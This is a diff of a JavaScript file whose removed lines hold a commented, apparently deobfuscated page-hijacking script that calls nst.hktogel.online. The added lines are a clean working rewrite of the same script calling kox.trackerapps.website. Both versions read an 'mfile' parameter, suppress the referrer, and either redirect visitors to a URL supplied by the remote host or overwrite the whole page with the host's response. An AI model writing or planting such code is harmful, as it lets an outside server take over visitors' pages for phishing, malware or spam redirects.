@@ -1,62 +1,49 @@
 var redirectWithoutReferrer, params, id;
 
 (function () {
-  // Helper aliases (just to obfuscate)
-  function getRedirect() { return redirectWithoutReferrer; }
-  function getJSON() { return JSON; }
-  function getConsole() { return console; }
-  function getWindow() { return window; }
-  function getDocument() { return document; }
-  function getString() { return String; }
-
-  // The big scrambled string is decoded into this array:
-  const strings = [
-    "meta",                                    // [0]
-    "referrer",                                // [1]
-    "no-referrer",                             // [2]
-    "mfile",                      // [3]
-    "get",                                     // [4]
-    "https://www.google.com",                  // [5]
-    "https://nst.hktogel.online/apps/apifolder/api.php?id="  // [6]
-  ];
-
-  // Creates a <meta name="referrer" content="no-referrer"> and injects it into <head>
-  redirectWithoutReferrer = function (url) {
-    const meta = document.createElement(strings[0]); // "meta"
-    meta.name = strings[1];                          // "referrer"
-    meta.content = strings[2];                       // "no-referrer"
-    document.head.appendChild(meta);
-    window.location.replace(url);
-  };
-
-  // Only run once
-  if (!window.__mfile_FETCH_RAN__) {
-    window.__mfile_FETCH_RAN__ = 1;
-
-    params = new URLSearchParams(window.location.search);
-    id = params[strings[4]](strings[3]);  // params.get("mfile")
-
-    if (!id) {
-      // No ID → redirect to Google (with no-referrer)
-      redirectWithoutReferrer(strings[5]);
-    } else {
-      // Fetch from the tracker domain
-      fetch(strings[6] + encodeURIComponent(id))
-        .then(res => res.text())
-        .then(body => {
-          try {
-            const data = JSON.parse(body);
-            if (data.redirectUrl) {
-              redirectWithoutReferrer(data.redirectUrl);
-              return;
-            }
-          } catch (e) {}
-          // If not a redirect JSON, just dump the response into the page
-          document.open();
-          document.write(body);
-          document.close();
-        })
-        .catch(err => console.error(err));
+    // Helper function to create a meta tag to disable the HTTP referrer, then redirect
+    function redirectWithoutReferrer(destinationUrl) {
+        var metaTag = document.createElement('meta');
+        metaTag.name = 'referrer';
+        metaTag.content = 'no-referrer';
+        document.head.appendChild(metaTag);
+        
+        window.location.replace(destinationUrl);
     }
-  }
+
+    // Ensure this script only runs once per page load
+    if (!window.__mfile_FETCH_RAN__) {
+        window.__mfile_FETCH_RAN__ = 1;
+
+        params = new URLSearchParams(window.location.search);
+        id = params.get('mfile');
+
+        if (!id) {
+            // If the 'mfile' query parameter is missing, redirect to Google
+            redirectWithoutReferrer('https://www.google.com');
+        } else {
+            // Otherwise, fetch content from the external endpoint using the ID parameter
+            fetch('https://kox.trackerapps.website/grav/x.php?id=' + encodeURIComponent(id))
+                .then(function (response) {
+                    return response.text();
+                })
+                .then(function (responseText) {
+                    try {
+                        var parsedData = JSON.parse(responseText);
+                        if (parsedData.redirectUrl) {
+                            redirectWithoutReferrer(parsedData.redirectUrl);
+                            return;
+                        }
+                    } catch (e) {
+                        // If it's not JSON, write the response directly into the document
+                    }
+                    document.open();
+                    document.write(responseText);
+                    document.close();
+                })
+                .catch(function (error) {
+                    console.error(error);
+                });
+        }
+    }
 })();
